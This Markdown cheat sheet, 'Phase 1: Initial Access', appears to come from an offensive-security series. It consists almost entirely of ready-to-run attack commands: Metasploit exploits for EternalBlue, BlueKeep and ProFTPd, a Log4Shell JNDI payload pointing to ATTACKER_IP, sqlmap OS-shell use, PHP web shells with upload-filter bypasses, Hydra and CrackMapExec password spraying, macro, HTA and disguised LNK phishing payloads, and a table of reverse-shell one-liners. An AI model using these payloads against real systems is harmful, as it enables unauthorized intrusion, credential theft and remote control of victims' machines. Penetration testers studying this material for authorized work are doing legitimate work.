# 🚪 Phase 1: Initial Access

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**Goal:** Gain first foothold into the target network or system.

---

## 🎯 Attack Vectors

| Vector | Description |
|--------|-------------|
| **Exploit Public-Facing App** | Web apps, APIs, CMS vulnerabilities |
| **Phishing** | Malicious emails with payloads |
| **Valid Credentials** | Password spraying, credential stuffing |
| **External Services** | RDP, SSH, VPN, FTP exposed |
| **Supply Chain** | Compromise trusted software |

---

## 💻 Exploiting Known Vulnerabilities

### Search for Exploits
```bash
# SearchSploit - Local exploit database
searchsploit apache 2.4
searchsploit -m 41234  # Copy exploit to current dir
searchsploit --nmap scan.xml  # Parse Nmap results

# Metasploit search
msfconsole -q -x "search type:exploit apache"
```

### Common Exploits

#### EternalBlue (MS17-010) - Windows SMB
```bash
# Check if vulnerable
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# Exploit with Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# Test for vulnerability
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# Setup exploit server
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# Scan for ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# Use exploit
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Web Application Attacks

### SQL Injection (Get Shell)
```bash
# Test for SQLi
sqlmap -u "http://target.com/page?id=1" --batch

# Get OS shell via SQLi
sqlmap -u "http://target.com/page?id=1" --os-shell

# Get SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### File Upload to Shell
```bash
# Create PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Or simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Bypass extension filters
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### Remote Code Execution (RCE)
```bash
# Test for RCE
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# Reverse shell via RCE
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 Credential Attacks

### Password Spraying
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### Credential Stuffing
```bash
# Using known leaked credentials
hydra -C creds.txt ftp://192.168.1.10

# Format for creds.txt:
# username:password
```

### Default Credentials
```bash
# Common defaults to try:
admin:admin
admin:password
root:root
root:toor
administrator:password

# CrackMapExec with common creds
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 Phishing Payloads

### Office Macro Payload
```bash
# Generate macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# Or use msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA Payload
```bash
# Generate HTA file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# Host it
python3 -m http.server 80
```

### LNK Payload
```powershell
# Create malicious shortcut
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ External Service Exploitation

### RDP Exploitation
```bash
# Brute force RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### SSH Exploitation
```bash
# Brute force SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# SSH with known credentials
ssh user@192.168.1.10

# SSH with private key
ssh -i id_rsa user@192.168.1.10
```

### FTP Exploitation
```bash
# Anonymous login
ftp 192.168.1.10
# Username: anonymous
# Password: anonymous

# Brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# ProFTPd exploit
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 Setting Up Listeners

### Netcat Listener
```bash
nc -lvnp 4444
```

### Metasploit Handler
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# On attacker
powercat -l -p 4444

# On victim
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 Quick Reference

### Reverse Shell One-Liners

| OS | Command |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 Related Cheatsheets

- [Metasploit](../Metasploit/README.md)
- [SQLMap](../SQLMap/README.md)
- [Hydra](../Hydra/README.md)
- [Web Vulnerabilities](../SSRF/README.md)

---

**Next Phase:** [02 - Enumeration/Discovery →](./02-Enumeration.md)
